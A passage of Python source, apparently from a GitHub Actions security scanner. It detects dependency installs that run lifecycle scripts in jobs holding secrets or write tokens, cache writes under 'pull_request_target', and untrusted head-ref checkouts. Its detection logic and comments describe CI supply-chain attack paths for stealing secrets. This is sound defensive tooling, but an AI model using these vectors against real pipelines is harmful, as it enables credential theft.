    for name in _SECRET_REF_RE.findall(blob):
        if name.lower() in _GITHUB_TOKEN_NAMES:
            continue
        if name not in names:
            names.append(name)
    if isinstance(job.get("secrets"), str) and job["secrets"].strip() == "inherit":
        # A called workflow inheriting the caller's whole secret set is the
        # broadest payoff there is; it carries no `secrets.NAME` token to find.
        names.append("<secrets: inherit>")
    return names


def _write_scopes(perms: Any) -> list[str]:
    """`scope: write` names in a `permissions:` block, or [] .

    `permissions: write-all` (a string) is the whole set; `permissions: {}` and
    read-only blocks yield nothing, which is what makes the negative case
    silent rather than merely lower-severity.
    """
    if isinstance(perms, str):
        return ["write-all"] if perms.strip() == "write-all" else []
    if not isinstance(perms, dict):
        return []
    return [
        str(k) for k, v in perms.items()
        if isinstance(v, str) and v.strip().lower() == "write"
    ]


def _job_effective_write_scopes(doc: dict[str, Any], job: dict[str, Any]) -> list[str]:
    """Write scopes effective FOR THIS JOB.

    A job's own `permissions:` block replaces the workflow-level one outright
    (GitHub does not merge them), so the workflow block is only consulted when
    the job declares none. Reading both unconditionally would report a write
    scope a job that scoped itself down does not actually hold.

    An ABSENT `permissions:` block yields no write scope, deliberately. What
    the default `GITHUB_TOKEN` grants is a repository/organization setting,
    invisible in this YAML, and GitHub's own default for repositories created
    since 2023 is read-only — so treating silence as write would manufacture a
    payoff leg on the safe default and fire P14.25 on very nearly every repo
    that installs dependencies, which is the hygiene-check shape the catalog
    rejects for this pattern. (The asymmetry with the npm-v12 ruling above is
    the point: there the unknown default is the DANGEROUS one, so not firing
    would hide a live finding; here it is the safe one.) A permissive default
    token is not unreported — the `sec.permissions.workflow-declares` and
    `sec.permissions.write-scoped` config facts score exactly that, and P14.18
    flags where a write scope meets an untrusted trigger.
    """
    if "permissions" in job:
        return _write_scopes(job.get("permissions"))
    return _write_scopes(doc.get("permissions"))


def _strip_shell_comment(line: str) -> str:
    """`line` with any trailing shell comment removed, QUOTE-AWARE.

    A `#` only opens a comment when it is unquoted and starts a word — the
    shell's own rule. Cutting at the first `#` regardless truncated
    `npm install "github:user/repo#tag" --ignore-scripts` before its flag and
    reported a hardened install as a finding.
    """
    out: list[str] = []
    for ch, is_syntax in _shell_scan(line):
        if is_syntax and ch == "#" and (not out or out[-1].isspace()):
            break
        out.append(ch)
    return "".join(out)


def _shell_scan(text: str) -> Iterator[tuple[str, bool]]:
    """``(char, is_shell_syntax)`` for each character of a shell command.

    ``is_shell_syntax`` is False for anything the shell would read as DATA —
    inside quotes, or escaped by a backslash. Both callers below need exactly
    this distinction and they need to agree on it, so it is computed once:
    the bugs here have all been one reader treating as syntax what the other
    read as data. Backslash escapes apply unquoted and inside double quotes;
    inside single quotes nothing escapes, which is the shell's own rule.
    """
    quote: str | None = None
    i = 0
    n = len(text)
    while i < n:
        ch = text[i]
        if quote != "'" and ch == "\\" and i + 1 < n:
            yield ch, False
            yield text[i + 1], False
            i += 2
            continue
        if quote:
            yield ch, False
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in "'\"":
            quote = ch
            yield ch, False
            i += 1
            continue
        yield ch, True
        i += 1


def _install_command_segments(command: str) -> list[str]:
    """`command` split on its unquoted `;` `&` `&&` `|` `||` separators.

    Used by the P14.25 install detector, which must split on a bare `|` too:
    `--ignore-scripts` protects the command it is WRITTEN on, so in
    `npm ci --ignore-scripts | npm install` the flag covers the first command
    and the piped-to `npm install` is still an unprotected install. (This is a
    DIFFERENT question from `_pipeline_command_segments`, which keeps a pipeline
    whole because a `… | tee file` pipeline is one logical write.) The name was
    once shared between the two, and the pipeline-whole definition silently
    overrode this one — issue #278 — so a bare-pipe install was read as
    protected. They are two named functions now.

    Quote-aware for the same reason as the comment strip: splitting
    `npm install "a|b" --ignore-scripts` on the quoted pipe put the flag in a
    different segment from the install it protects, and the install was
    reported.
    """
    marked = list(_shell_scan(command))
    segments: list[str] = []
    current: list[str] = []
    i = 0
    while i < len(marked):
        ch, is_syntax = marked[i]
        if is_syntax and ch in ";&|":
            segments.append("".join(current))
            current = []
            nxt = marked[i + 1] if i + 1 < len(marked) else None
            i += 2 if nxt and nxt[1] and nxt[0] == ch else 1
            continue
        current.append(ch)
        i += 1
    segments.append("".join(current))
    return segments


def _shell_commands(lines: list[str]) -> Iterator[tuple[int, str, str]]:
    """``(line_no, verbatim first line, joined command text)`` per COMMAND.

    The unit of analysis is the shell command, not the source line, because a
    trailing backslash continues one command across several lines:

        npm install \\
          --ignore-scripts

    is a single hardened install, and judging its first line alone reports a
    finding the repository does not have. Comments are stripped before the
    continuation is read, and the reported line number / verbatim text stay
    those of the command's FIRST line, so the evidence still points a reader
    at the place the command starts.
    """
    idx = 0
    while idx < len(lines):
        first = idx
        parts: list[str] = []
        while True:
            stripped = _strip_shell_comment(lines[idx])
            parts.append(stripped.rstrip().rstrip("\\"))
            if stripped.rstrip().endswith("\\") and idx + 1 < len(lines):
                idx += 1
                continue
            break
        yield first + 1, lines[first], " ".join(parts)
        idx += 1


def _is_unprotected_install(command: str) -> bool:
    """Does this shell command line run an install with lifecycle scripts on?

    The single definition of "unprotected install" — the job-level gate and
    the evidence lookup both call it. They used to ask the question at
    different granularities: the gate searched a whole `run:` scalar, so a
    scalar holding `npm ci --ignore-scripts` on one line and a plain
    `npm install` on the next was read as protected and the job was dropped,
    and a `--ignore-scripts` written in a shell COMMENT suppressed the real
    install below it. One definition cannot disagree with itself that way.

    `--ignore-scripts` is matched against the SEGMENT it belongs to, not the
    whole line: it protects the command it is written on. `command` is split by
    `_install_command_segments`, which breaks on `;` `&` `&&` `||` AND a bare
    `|`, so in both `npm ci --ignore-scripts && npm install` and
    `npm ci --ignore-scripts | npm install` the flag covers only the first
    command and the second install is a finding.

    A global or single-package install is not this vector and is excluded here
    too — see `_is_dependency_tree_install`.
    """
    return any(
        _INSTALL_CMD_RE.search(seg)
        and not _IGNORE_SCRIPTS_RE.search(seg)
        and _is_dependency_tree_install(seg)
        for seg in _install_command_segments(command)
    )


def _scalar_has_unprotected_install(scalar: str) -> bool:
    """Any command in this `run:` scalar an unprotected install."""
    return any(
        _is_unprotected_install(cmd)
        for _line, _raw, cmd in _shell_commands(scalar.splitlines())
    )


# The quotes are optional because `- "run": npm ci` is legal YAML and means
# exactly `- run: npm ci`. Without them the step is not recognised as shell at
# all, and the install inside it stops being reportable.
_RUN_KEY_LINE_RE = re.compile(r"""^(\s*)(?:-\s+)?["']?run["']?\s*:\s*(.*)$""")
_BLOCK_SCALAR_RE = re.compile(r"^[|>][+-]?\d*\s*(#.*)?$")


def _run_scalar_line_numbers(text: str) -> set[int]:
    """1-based line numbers whose content is SHELL — inside a `run:` scalar.

    Everything else in a workflow file is YAML, and a regex hunting for install
    commands does not belong there. Without this, `- name: Run pnpm install`
    matched the install regex and the evidence quoted a step NAME as if it were
    the command (immich's f7/f8/f11 all quoted `- name: Run pnpm install`), and
    a `#` comment mentioning an install could do the same.

    Two forms are recognised: an inline scalar (`run: pnpm install`), whose own
    line is shell; and a block scalar (`run: |`), whose shell is every
    following line indented deeper than the `run:` key.
    """
    shell: set[int] = set()
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        m = _RUN_KEY_LINE_RE.match(lines[i])
        if m is None:
            i += 1
            continue
        indent = len(m.group(1))
        rest = m.group(2).strip()
        if rest and not _BLOCK_SCALAR_RE.match(rest):
            # Inline scalar. It may still continue onto more-indented lines
            # (plain multi-line YAML scalars), which are shell as well.
            shell.add(i + 1)
            j = i + 1
            while j < len(lines):
                nxt = lines[j]
                if not nxt.strip():
                    break
                if len(nxt) - len(nxt.lstrip()) <= indent:
                    break
                shell.add(j + 1)
                j += 1
            i = j
            continue
        # Block scalar: consume the indented body (blank lines included).
        j = i + 1
        while j < len(lines):
            nxt = lines[j]
            if nxt.strip() and len(nxt) - len(nxt.lstrip()) <= indent:
                break
            if nxt.strip():
                shell.add(j + 1)
            j += 1
        i = j
    return shell


def _install_line(
    text: str, job_range: tuple[int, int] | None
) -> tuple[int, str, str] | None:
    """(line_no, verbatim line, joined command) of the QUALIFYING install.

    Scoped to the job's own source range, so the evidence quotes the actual
    command instead of a synthesized sentence, and to `run:` scalar content, so
    it quotes shell rather than a step name or a comment. It returns the first
    command that would itself make the job a finding — not the first line the
    install regex happens to touch. leonardo's job bootstraps with
    `npm install -g npm@11` on one line and runs the real `pnpm install` at
    :31; the evidence used to quote the bootstrap, so the reader was pointed at
    a command that is not the vector and could not be fixed by the recipe.
    A command carrying `--ignore-scripts` is skipped here as well as at the job
    level: a job that fixed one install and left another still has the unfixed
    one quoted.
    """
    found = _install_lines(text, job_range)
    return found[0] if found else None


def _install_lines(
    text: str, job_range: tuple[int, int] | None
) -> list[tuple[int, str, str]]:
    """EVERY qualifying install in the job, in source order.

    A job can install more than once, and the build allowlist can be a
    different thing at each of them — disabled above the first, put back before
    the second. Deciding mitigation on the first install alone gets both
    directions wrong: it suppressed a job whose later install was exposed, and
    it reported a job whose install was disabled by a step further down.
    """
    lines = text.splitlines()
    shell_lines = _run_scalar_line_numbers(text)
    start, end = job_range if job_range else (1, len(lines))
    out = []
    for line_no, raw, cmd in _shell_commands(lines):
        if line_no < start or line_no > min(end, len(lines)):
            continue
        if line_no not in shell_lines:
            continue
        if _is_unprotected_install(cmd):
            out.append((line_no, raw, cmd))
    return out


# --- P14.25 mitigation signals -----------------------------------------------
#
# The catalog used to assert, in every finding, that the job "runs this install
# with dependency lifecycle scripts enabled". That is not knowable from workflow
# YAML and for pnpm it is usually FALSE: pnpm 10 and later block dependency
# lifecycle scripts by default and only run them for packages named in
# `onlyBuiltDependencies` / `allowBuilds`. So the note now says what IS knowable
# — the install executes lifecycle scripts UNLESS the manager's version or
# configuration disables them — and names the per-manager condition.
#
# Two tiers of in-repo evidence, and the split is deliberate:
#
#   HARD (no finding at all) — a step in the SAME job, ordered BEFORE the
#   install, that empties or falsifies the build allowlist, together with a
#   `packageManager` pin resolving pnpm >= 10 (the mechanism only exists there).
#   vitejs/vite writes `yq '.allowBuilds[]=false' -i pnpm-workspace.yaml`
#   immediately above `pnpm install` in both its release and its publish
#   workflow; reporting those was a false positive twice over.
#
#   PARTIAL (the finding STANDS, with the mitigation named in its note) — a
#   committed `pnpm-workspace.yaml` allowlist, or a pnpm >= 10 pin on its own.
#   A committed file is not proof of the file at install time: vite's own
#   release jobs rewrite it mid-run, which is the counter-example. And a pin
#   with a NON-empty allowlist means scripts still run for the allow-listed
#   packages (vercel/next.js allows `@ast-grep/cli`). Suppressing on either
#   would be the false-negative shape the NEVER rules ban, so both are
#   disclosed rather than acted on.
_PACKAGE_MANAGER_PIN_RE = re.compile(
    r"\"packageManager\"\s*:\s*\"(npm|pnpm|yarn)@((\d+)[^\"+]*)"
)
_ALLOWLIST_KEY_RE = re.compile(r"(allowBuilds|onlyBuiltDependencies)")
_ALLOWLIST_DISABLE_RE = re.compile(
    r"(allowBuilds|onlyBuiltDependencies)\s*(?:\[\s*\])?\s*[:=]\s*"
    r"(?:false|\[\s*\]|\{\s*\})"
)
# A `#` that starts a shell comment: at the start of the line or after
# whitespace. Everything from there on is inert text, not an executed command.
_COMMENT_TAIL_RE = re.compile(r"(?:^|\s)#.*$")
# The config file a real disable-the-builds step writes.
_ALLOWLIST_TARGET = r"[^\s'\"]*(?:pnpm-workspace\.ya?ml|package\.json|\.npmrc)"
# The three ways a line actually WRITES that file. Each binds the write to the
# target in ONE expression, because testing "names a config file" and "has a
# redirect" independently accepts lines where the two are unrelated:
# `yq '.allowBuilds[]=false' pnpm-workspace.yaml > /dev/null` reads the file
# and writes to the bit bucket, changing nothing. Naming the file is not
# enough either — the same command without `-i` just prints the edited
# document. vitejs/vite's real step is
# `yq '.allowBuilds[]=false' -i pnpm-workspace.yaml`.
_ALLOWLIST_WRITE_RES = (
    # in-place edit of the target: `yq … -i pnpm-workspace.yaml`, `sed -i … pkg`.
    # Gated on the command being one that HAS an in-place mode: `-i` means
    # case-insensitive to grep, so `grep -i allowBuilds=false
    # pnpm-workspace.yaml` is a read-only check that would otherwise read as a
    # mutation.
    re.compile(r"\b(?:yq|sed|perl|dasel|sponge|crudini)\b.*"
               r"(?:^|\s)(?:-i|--in-?place)(?:=\S*)?(?:\s+\S+)*?\s+"
               + _ALLOWLIST_TARGET + r"(?:\s|$)"),
    # redirect or tee INTO the target: `… >> pnpm-workspace.yaml`
    re.compile(r"(?:>>?\s*|\|\s*tee\s+(?:-a\s+)?)" + _ALLOWLIST_TARGET),
    # the package manager's own writer — bound to the allowlist key, or an
    # unrelated `pnpm config set registry …` on the same line as inert disable
    # text would read as a mitigation.
    re.compile(r"pnpm\s+config\s+set\s+\S*"
               r"(?:allowBuilds|onlyBuiltDependencies)"),
)
# A line that only PRINTS: `echo`/`printf` with nothing to write into. Its
# argument can quote an entire real mitigation, so the write test above cannot
# tell it apart on its own.
_INERT_PRINT_RE = re.compile(r"^(?:echo|printf)\b(?![^>]*(?:>|\|\s*tee\b))")


def _writes_the_build_allowlist(code: str) -> bool:
    """Does this shell line actually WRITE the build allowlist it mentions?"""
    return any(r.search(code) for r in _ALLOWLIST_WRITE_RES)


def _repo_root_for_workflow(file_path: Path) -> Path | None:
    """The repo root a `.github/workflows/<f>.yml` path sits in, or None."""
    parts = file_path.resolve().parts
    if len(parts) < 4 or parts[-2] != "workflows" or parts[-3] != ".github":
        return None
    return Path(*parts[:-3])


def _package_manager_pin(root: Path | None) -> tuple[str, int, str] | None:
    """`(manager, major, version)` from the repo's `packageManager` field.

    The full version travels with the major because the note quotes it: a
    reader told "this repo pins `pnpm@10`" cannot check that against a
    `package.json` that says `pnpm@10.33.0`.
    """
    if root is None:
        return None
    try:
        blob = (root / "package.json").read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None
    m = _PACKAGE_MANAGER_PIN_RE.search(blob)
    if m is None:
        return None
    return m.group(1), int(m.group(3)), m.group(2)


def _pnpm_build_allowlist(root: Path | None) -> str | None:
    """``"restrictive"`` / ``"permissive"`` / None for the repo's build
    allowlist.

    ``restrictive`` means the declaration exists and permits NOTHING to build
    (an empty list, or a map whose every value is falsy — vitejs/vite ships
    `allowBuilds: {core-js: false, vue-demi: false}`). ``permissive`` means at
    least one package may build (vercel/next.js allows `@ast-grep/cli`).

    Two files can hold the declaration, and BOTH are read, in pnpm's own order
    of precedence: `pnpm-workspace.yaml` first, then `package.json`'s
    `pnpm.onlyBuiltDependencies` — which is where adobe/leonardo declares it,
    and reading only the workspace file left that repo's finding saying the
    allowlist was undeclared when the repo declares it. This changes NOTE
    SPECIFICITY only: the allowlist never suppresses a finding on its own (that
    takes an in-job write; see `_allowlist_writes`).
    """
    if root is None:
        return None

    def _verdict(value: Any) -> str | None:
        if isinstance(value, dict):
            return "permissive" if any(value.values()) else "restrictive"
        if isinstance(value, list):
            return "permissive" if value else "restrictive"
        return None

    for name in ("pnpm-workspace.yaml", "pnpm-workspace.yml"):
        try:
            text = (root / name).read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        try:
            doc = yaml.safe_load(text)
        except yaml.YAMLError:
            return None
        if not isinstance(doc, dict):
            break
        for key in ("allowBuilds", "onlyBuiltDependencies"):
            if key in doc:
                verdict = _verdict(doc.get(key))
                if verdict is not None:
                    return verdict
        break

    # `package.json` → `"pnpm": {"onlyBuiltDependencies": [...]}`.
    try:
        blob = (root / "package.json").read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None
    try:
        pkg = json.loads(blob)
    except json.JSONDecodeError:
        return None
    if not isinstance(pkg, dict):
        return None
    pnpm_cfg = pkg.get("pnpm")
    if not isinstance(pnpm_cfg, dict):
        return None
    for key in ("onlyBuiltDependencies", "allowBuilds"):
        if key in pnpm_cfg:
            return _verdict(pnpm_cfg.get(key))
    return None


def _allowlist_writes(
    text: str, job_range: tuple[int, int] | None
) -> list[tuple[int, bool, str]]:
    """Every EXECUTED write to the build allowlist in this job, in order:
    ``(line_no, disables, verbatim line)``.

    This is the one thing that suppresses a P14.25 finding OUTRIGHT, so the
    line has to be an executed mutation of the package manager's build
    allowlist and not merely text that mentions one. Two inert shapes reached
    the unconditional suppression before this gate: a shell COMMENT
    (`# allowBuilds=false — set in pnpm-workspace.yaml`, a perfectly natural
    thing to write) and an echoed string with nowhere to go
    (`echo 'allowBuilds: false'`). A third, subtler one: `yq
    '.allowBuilds[]=false' pnpm-workspace.yaml` WITHOUT `-i` names the file but
    only prints the edited document — the file on disk is untouched. Each
    silenced a genuine privileged install. So the mitigation must survive
    comment-stripping, name the config, AND write it — which is what a real
    mitigation does: vitejs/vite runs
    `yq '.allowBuilds[]=false' -i pnpm-workspace.yaml`.

    All three tests run per COMMAND, not per line. Run against a whole line
    they can be satisfied by different commands that have nothing to do with
    each other: `echo allowBuilds=false; pnpm config set registry … > .npmrc`
    has inert disable text in one command and an unrelated write in the next,
    and passed every line-level gate.

    The ORDER is what the caller needs. A job can turn the allowlist off and
    back on around several installs, and only the last write before a given
    install decides whether that install is protected. Answering "does a
    disable appear anywhere above" gets it wrong in both directions: it
    suppressed a job whose later install was exposed, and it reported a job
    whose install was disabled by a step further down.
    """
    lines = text.splitlines()
    shell_lines = _run_scalar_line_numbers(text)
    start, end = job_range if job_range else (1, len(lines))
    writes: list[tuple[int, bool, str]] = []
    for idx in range(max(start, 1), min(end, len(lines)) + 1):
        if idx not in shell_lines:
            continue
        raw = lines[idx - 1]
        for whole in _pipeline_command_segments(_COMMENT_TAIL_RE.sub("", raw)):
            # `NOTE="pnpm config set allowBuilds=false"` stores a string; it
            # runs nothing. Leading `VAR=value` assignments are stripped, and a
            # segment that is ONLY assignments is not a command at all.
            seg = _command_after_assignments(whole)
            if not seg.strip():
                logger.debug(
                    "P14.25: line %d assigns allowlist-shaped text but runs "
                    "no command — not a mitigation: %s", idx, raw.strip(),
                )
                continue
            if not _ALLOWLIST_KEY_RE.search(seg):
                continue
            if not _writes_the_build_allowlist(seg):
                logger.debug(
                    "P14.25: line %d mentions a build allowlist but does not "
                    "write it — not a mitigation: %s", idx, raw.strip(),
                )
                continue
            if _INERT_PRINT_RE.match(seg.strip()):
                # `echo "yq '.allowBuilds[]=false' -i pnpm-workspace.yaml"`
                # prints a mitigation instead of running one, and the quoted
                # `-i` would otherwise satisfy the write test.
                logger.debug(
                    "P14.25: line %d only PRINTS an allowlist mutation — not "
                    "a mitigation: %s", idx, raw.strip(),
                )
                continue
            # A write that is not a disable re-opens the allowlist.
            writes.append(
                (idx, bool(_ALLOWLIST_DISABLE_RE.search(seg)), raw.strip())
            )
    return writes


def _builds_disabled_at(
    writes: list[tuple[int, bool, str]], install_line: int
) -> str | None:
    """The verbatim line that leaves builds disabled at `install_line`, if the
    LAST allowlist write above it is a disable."""
    prior = [w for w in writes if w[0] < install_line]
    if prior and prior[-1][1]:
        return prior[-1][2]
    return None


_SHELL_SEGMENT_RE = re.compile(r"(?:;|&&|\|\||&(?!&))")
# Single quotes take no escapes in shell; double quotes do, so a `\"` inside
# one must not end the span — otherwise the rest of the string is treated as
# bare shell and a quoted `;` becomes a command boundary again.
_QUOTED_RUN_RE = re.compile(r"'[^']*'|\"(?:\\.|[^\"\\])*\"")
# A leading `VAR=value` (optionally `export`ed). Shell runs the command AFTER
# these; a segment made only of them runs nothing at all.
_LEADING_ASSIGNMENT_RE = re.compile(
    r"^\s*(?:export\s+)?[A-Za-z_][A-Za-z0-9_]*="
    r"(?:'[^']*'|\"(?:\\.|[^\"\\])*\"|\S*)\s*"
)


def _command_after_assignments(segment: str) -> str:
    """`FOO=1 BAR="x" yq …` → `yq …`; `NOTE="…"` → `` (it runs nothing)."""
    prev = None
    out = segment
    while out != prev:
        prev = out
        out = _LEADING_ASSIGNMENT_RE.sub("", out, count=1)
    return out


def _pipeline_command_segments(line: str) -> list[str]:
    """One shell line split into the commands it actually runs.

    A bare `|` is NOT a separator here: a pipeline is one logical command, and
    `echo 'allowBuilds: false' | tee -a pnpm-workspace.yaml` really does write
    the file. (The P14.25 install detector wants the opposite — see
    `_install_command_segments` — which is why these are two named functions.)

    Quote-aware, because splitting blind cuts BOTH ways: `echo "note; pnpm
    config set allowBuilds=false"` is one `echo` of inert text, but a naive
    split on `;` manufactures a second "command" that satisfies every
    mitigation test and silences the install below it. Separators are located
    on a copy with quoted spans masked, then the ORIGINAL text is sliced at
    those offsets so each segment keeps its real content.
    """
    masked = _QUOTED_RUN_RE.sub(lambda m: "x" * len(m.group(0)), line)
    out, prev = [], 0
    for m in _SHELL_SEGMENT_RE.finditer(masked):
        out.append(line[prev:m.start()])
        prev = m.end()
    out.append(line[prev:])
    return [s for s in out if s.strip()]


def _manager_condition_note(
    manager: str | None,
    command: str,      # every `run:` scalar in the job, joined
    pin: tuple[str, int, str] | None,
    allowlist: str | None,
) -> str:
    """The per-manager sentence: under what condition do scripts actually run?

    Per-manager because the single npm-v12 caveat rendered on `pnpm` and `yarn`
    findings too, where it contradicted itself — three QA batches flagged the
    same self-contradiction.
    """
    if manager == "npm":
        # Bounded on the left so `pnpm@10` is not read as `npm@10`.
        pinned = re.search(r"(?<![\w.-])npm@[\^~]?(\d+)", command)
        if pinned:
            version = (
                f"this job installs npm {pinned.group(1)} explicitly, and that "
                f"major still runs them"
            )
        elif pin and pin[0] == "npm":
            version = (
                f"this repo pins `npm@{pin[2]}` via `packageManager`, and that "
                f"major "
                + ("does not run them by default" if pin[1] >= 12
                   else "still runs them")
            )
        else:
            version = (
                "the npm major your runner resolves is not visible in this "
                "YAML, so confirm it before treating this as closed"
            )
        return (
            "npm runs dependency `preinstall`/`install`/`postinstall` scripts "
            "by default through npm 11; npm v12 (announced 2026-06-09, shipped "
            f"2026-07-08) turns them off by default — {version}."
        )
    if manager == "pnpm":
        base = (
            "pnpm 9 and earlier run dependency lifecycle scripts by default; "
            "pnpm 10 and later block them unless the package is allow-listed "
            "in `onlyBuiltDependencies` / `allowBuilds`"
        )
        signals: list[str] = []
        if pin and pin[0] == "pnpm":
            signals.append(
                f"this repo pins `pnpm@{pin[2]}` via `packageManager`")
        if allowlist == "permissive":
            signals.append(
                "and its committed allowlist still permits at least one "
                "package to build, so scripts run for those"
            )
        elif allowlist == "restrictive":
            signals.append(
                "and its committed allowlist permits nothing to build — but a "
                "committed file is not the file at install time, so confirm no "
                "step rewrites it"
            )
        if signals:
            return base + " — " + " ".join(signals) + "."
        return (
            base + " — which major your runner resolves is not visible in this "
            "YAML, so confirm it before treating this as closed."
        )
    if manager == "yarn":
        if pin and pin[0] == "yarn":
            era = (
                "Classic, which runs them" if pin[1] < 2
                else "Berry, where the `enableScripts` setting governs them"
            )
            return (
                "Yarn Classic (1.x) runs dependency lifecycle scripts by "
                "default; Yarn Berry (2+) is governed by its `enableScripts` "
                f"setting — this repo pins `yarn@{pin[2]}` via "
                f"`packageManager`, i.e. {era}."
            )
        return (
            "Yarn Classic (1.x) runs dependency lifecycle scripts by default; "
            "Yarn Berry (2+) is governed by its `enableScripts` setting — "
            "which line your runner resolves is not visible in this YAML, so "
            "confirm it before treating this as closed."
        )
    return (      # pragma: no cover - defensive
        "whether the install runs dependency lifecycle scripts depends on the "
        "package manager version and configuration your runner resolves."
    )


def _job_run_texts(job: Any) -> list[str]:
    if not isinstance(job, dict):
        return []
    steps = job.get("steps")
    if not isinstance(steps, list):
        return []
    return [
        s["run"] for s in steps
        if isinstance(s, dict) and isinstance(s.get("run"), str)
    ]


def _correlation_install_scripts_in_privileged_job(
    file_path: Path,
) -> Iterator[RawHit]:
    """P14.25 — a dependency install that runs lifecycle scripts, in a job that
    holds secrets or a write-scoped token.

    Two conditions in ONE job: (1) a `run:` step invokes a package-manager
    install that executes `preinstall`/`install`/`postinstall` scripts —
    matched WITHOUT `--ignore-scripts`; (2) that job carries a live payoff —
    any `secrets.*` reference beyond `github.token`, `secrets: inherit`, or a
    write scope effective for the job. Either alone is not a finding: an
    install with nothing to steal hands the attacker nothing, and a
    credential-bearing job that never installs untrusted code is a different
    (non-)vector. One hit per qualifying job.

    The install leg is a DEPENDENCY-TREE install only — a global tool bootstrap
    (`npm i -g corepack@0.31`) or a named single-package install is excluded;
    see `_is_dependency_tree_install`.

    Which manager version a runner resolves is NOT knowable from workflow YAML,
    so this detector does not quietly stand down on the platform defaults — it
    fires and the derived note names the per-manager condition. Silently not
    firing on an unverifiable assumption is the false-negative shape the NEVER
    rules ban. It DOES stand down on hard, in-job evidence of disablement; see
    the mitigation-signal comment above `_repo_root_for_workflow`.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    ranges = {name: (start, end) for name, start, end in job_line_ranges(file_path)}
    root = _repo_root_for_workflow(file_path)
    pin = _package_manager_pin(root)
    allowlist = _pnpm_build_allowlist(root)
    for job_name, job in _walk_jobs(doc):
        runs = _job_run_texts(job)
        if not any(_scalar_has_unprotected_install(r) for r in runs):
            continue
        secrets = _job_secret_refs(job, doc)
        writes = _job_effective_write_scopes(doc, job)
        if not secrets and not writes:
            continue
        candidates = _install_lines(text, ranges.get(job_name))
        found = candidates[0] if candidates else None
        if found is None:
            # The parsed scalar matched but no raw line did (a folded scalar).
            # Reported as a coverage gap rather than dropped silently.
            _DROPPED_MATCHES.append({
                "file": str(file_path),
                "reason": (
                    f"P14.25: jobs.{job_name} runs a script-executing install "
                    f"but the command line could not be located in the raw "
                    f"file (folded scalar?) — this match is NOT reported"
                ),
            })
            continue
        line, raw, command = found
        manager = _install_manager(command)

        # HARD evidence of disablement — an in-job step that empties the build
        # allowlist before the install, on a repo that pins pnpm >= 10 (where
        # that allowlist is the mechanism). No finding at all; asserting one
        # here would be a false positive against the repo's own mitigation.
        if manager == "pnpm" and pin and pin[0] == "pnpm" and pin[1] >= 10:
            allowlist_writes = _allowlist_writes(text, ranges.get(job_name))
            # Mitigation is decided PER INSTALL, by the last allowlist write
            # above it — a job can turn builds off, install, put them back and
            # install again. Report the first install that is exposed, so the
            # evidence quotes a command the reader can actually act on; if
            # every install in the job is covered, there is no finding.
            # …and only for pnpm installs: the pnpm build allowlist says
            # nothing about an `npm ci` or `yarn install` in the same job.
            exposed = next(
                (c for c in candidates
                 if _install_manager(c[2]) != "pnpm"
                 or _builds_disabled_at(allowlist_writes, c[0]) is None),
                None,
            )
            if exposed is None:
                logger.debug(
                    "P14.25: %s jobs.%s disables dependency builds before "
                    "every install on a pnpm>=10 pin — not a finding",
                    file_path, job_name,
                )
                continue
            line, raw, command = exposed
            manager = _install_manager(command)

        payoff_parts = []
        if secrets:
            payoff_parts.append(
                "the job's environment carries secret(s) "
                + ", ".join(f"`{s}`" for s in secrets[:5])
                + (" …" if len(secrets) > 5 else "")
            )
        if writes:
            payoff_parts.append(
                "the job holds write scope(s) "
                + ", ".join(f"`{w}`" for w in sorted(writes))
            )
        yield RawHit(
            line=line,
            evidence=f"{line:>4}: {raw}  <-- here",
            match_text=raw.strip(),
            derived_note=(
                f"jobs.{job_name} runs this dependency-tree install where "
                f"lifecycle scripts execute UNLESS the package manager's "
                f"version or configuration disables them, and "
                + " and ".join(payoff_parts)
                + " — so a compromised dependency's install script executes "
                "holding them. "
                + _manager_condition_note(
                    manager, "\n".join(runs), pin, allowlist,
                )
            ),
        )


def _correlation_untrusted_trigger_writes_cache(
    file_path: Path,
) -> Iterator[RawHit]:
    """P14.7 — workflow has `pull_request_target` trigger AND any job writes
    the shared cache."""
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    on_node = _get_on_node(doc)
    triggers = _on_trigger_names(on_node) if on_node is not None else []
    if "pull_request_target" not in triggers:
        return
    for job_name, job in _walk_jobs(doc):
        if _job_uses_cache(job):
            line = _job_line_in_text(text, job_name)
            yield RawHit(
                line=line,
                evidence=(
                    f"{line:>4}: workflow runs on `pull_request_target` AND "
                    f"jobs.{job_name} writes the shared cache <-- here"
                    + _gate_note(job)
                ),
                match_text=job_name,
                derived=True,
            )


def _gate_note(job: Any) -> str:
    """A sentence naming this job's own `if:` condition, or "".

    cal.com's `pr.yml` gates its cache-writing job behind
    `needs.trust-check.outputs.is-trusted == 'true'`, and the report still read
    "a fork PR plants malware" with no mention of it. The gate is NOT a
    suppression — trust gates are routinely bypassable, and deciding that here
    would be guessing — but a reader who cannot see it cannot triage the
    finding.
    """
    if not isinstance(job, dict):
        return ""
    condition = job.get("if")
    if condition is None or isinstance(condition, (dict, list)):
        return ""
    text = " ".join(str(condition).split())
    if not text:
        return ""
    return (
        f"\n      this job carries a gate condition: {text} — the finding "
        f"stands only if that gate can be bypassed; verify it"
    )


def _attacker_head_ref(value: Any) -> bool:
    """True if a checkout `ref:`/`repository:` value resolves to attacker-
    controlled head code under an untrusted-event trigger."""
    if not isinstance(value, str):
        return False
    needles = (
        "github.event.pull_request.head",   # .sha / .ref / .repo.full_name
        "github.head_ref",
        "github.event.workflow_run.head",   # _sha / _branch / _commit
        "refs/pull/",                       # refs/pull/N/merge|head — the PR's
                                            # content either way
    )
    return any(n in value for n in needles)


def _job_checkout_head_then_executes(job: dict[str, Any]) -> tuple[int, str] | None:
    """The load-bearing predicate of P14.9: within ONE job, an
    `actions/checkout` of the attacker's head ref FOLLOWED by a step that
    executes from the working tree (`run:` or a local `./action`).

    The execution leg is a deliberate, documented over-approximation: a
    post-checkout `run:` step almost always executes tree-controlled content
    (install scripts, Makefiles, test suites), so we do not try to prove which
    file it touches. A checkout with no `ref:` (base/merge ref) never
    qualifies. Returns (checkout_step_index, ref_text) or None.
    """
    steps = job.get("steps")
    if not isinstance(steps, list):
        return None
    checkout_idx: int | None = None
    ref_text = ""
    for i, step in enumerate(steps):
        if not isinstance(step, dict):
            continue
        uses = step.get("uses")
